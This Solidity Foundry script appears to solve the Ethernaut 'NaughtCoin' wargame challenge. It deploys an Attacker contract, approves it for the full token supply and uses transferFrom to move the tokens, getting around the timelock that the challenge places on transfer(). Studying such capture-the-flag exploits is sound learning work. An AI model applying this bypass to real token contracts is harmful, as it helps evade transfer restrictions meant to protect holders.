// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {NaughtCoin} from "../src/NaughtCoin.sol";

contract Attacker {
    NaughtCoin public coin;

    constructor(address _naughtCoinAddress) {
        coin = NaughtCoin(_naughtCoinAddress);
    }

    function attack() public {
        coin.transferFrom(msg.sender, address(this), coin.INITIAL_SUPPLY());
    }
}

contract SolveNaughtCoin is Script {
    NaughtCoin public coin;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();
        coin = NaughtCoin(payable(vm.envAddress("NAUGHTCOIN_ADDRESS")));
        Attacker attacker = new Attacker(address(coin));
        coin.approve(address(attacker), coin.INITIAL_SUPPLY());
        attacker.attack();
        vm.stopBroadcast();
    }
}
